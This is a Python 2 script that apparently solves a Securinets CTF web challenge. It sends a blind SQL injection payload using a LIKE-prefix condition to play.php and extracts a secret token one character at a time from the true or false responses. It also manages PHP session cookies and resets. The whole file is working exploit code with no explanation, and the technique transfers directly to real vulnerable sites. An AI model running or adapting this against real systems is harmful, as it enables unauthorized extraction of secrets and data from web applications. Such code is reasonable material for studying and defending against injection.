import time
import random
import os
import string
import requests

token = ""
found = len(token)
letters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
letter_candidate = 0
payload = "val=' OR (ip='2.233.111.60' AND token LIKE '{}%') #"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded"
}
url_main = "https://web4.ctfsecurinets.com/"
url_index = url_main + "index.php"
url_play = url_main + "play.php"
url_reset = url_main + "reset.php"
url_start = url_main + "start.php"

global_debug = False
def debug(page, local_debug):
   if global_debug and local_debug:
      print page.status_code
      print page.headers
      print page.text

try:

   print "[*] Contacting '{}'.".format(url_reset)
   page = requests.get(url_reset, headers=headers)
   cookies = {"PHPSESSID": page.cookies["PHPSESSID"]}
   debug(page, False)
   

   while found < 100:

      print "[*] Contacting '{}'.".format(url_index)
      page = requests.get(url_index, headers=headers, cookies=cookies)
      debug(page, False)

      if "Session Expired" in page.text:
         print "[*] Session expired, contacting '{}'.".format(url_index)
         page = requests.get(url_index, headers=headers, cookies=cookies)
         debug(page, False)
      elif "Attempt" in page.text:
         letter = letters[letter_candidate]
         attempt = token + letter
         print "[*] Attempt '{}'.".format(attempt)
         data = payload.format(attempt)
         print "[*] Payload: {}.".format(data)
         page = requests.post(url_play, data=data, headers=headers, cookies=cookies)
         debug(page, False)
         
         if "True" in page.text:
            token += letter
            found += 1
            letter_candidate = 0
            print "[*] Correct letter, new token '{}'.".format(token)
         elif "Better luck next time" in page.text:
            letter_candidate = letter_candidate + 1
            print "[*] Wrong letter."         
         elif "Max Attempts Reahed" in page.text:
            print "[*] Max attempts reached, contacting '{}'.".format(url_index)
            page = requests.get(url_index, headers=headers, cookies=cookies)
            debug(page, False)
         else:
            print "[!] Something not working."
            break

      # Go to sleep.
      sleep_interval = 0
      print "[*] Sleeping {} secs.".format(sleep_interval)
      time.sleep(sleep_interval)

except KeyboardInterrupt:
   print "[-] Interrupted!"